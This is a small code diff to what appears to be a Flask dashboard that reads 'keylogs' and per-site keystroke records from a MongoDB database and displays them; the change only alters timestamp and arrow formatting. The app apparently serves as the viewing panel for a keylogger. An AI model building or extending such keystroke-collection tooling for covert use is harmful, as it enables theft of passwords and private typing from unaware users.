@@ -19,11 +19,11 @@ site_logs_collection = weblogger_db["sitelogs"]
 def home():
     # Fetch keylogs from MongoDB
     keylogs = keylogs_collection.find({})
-    formatted_keylogs = [f"{log['_id'].generation_time} > {log['text']}" for log in keylogs]
+    formatted_keylogs = [f"[{log['_id'].generation_time}] ---> {log['text']}" for log in keylogs]
 
     # Fetch site logs from MongoDB
     site_logs = site_logs_collection.find({})
-    formatted_site_logs = [f"<{log['site']}> [{log['_id'].generation_time}] > {log['keystroke']}" for log in site_logs]
+    formatted_site_logs = [f"<{log['site']}> [{log['_id'].generation_time}] ---> {log['keystroke']}" for log in site_logs]
 
     return render_template('index.html', logs=formatted_keylogs, site_logs=formatted_site_logs)
 
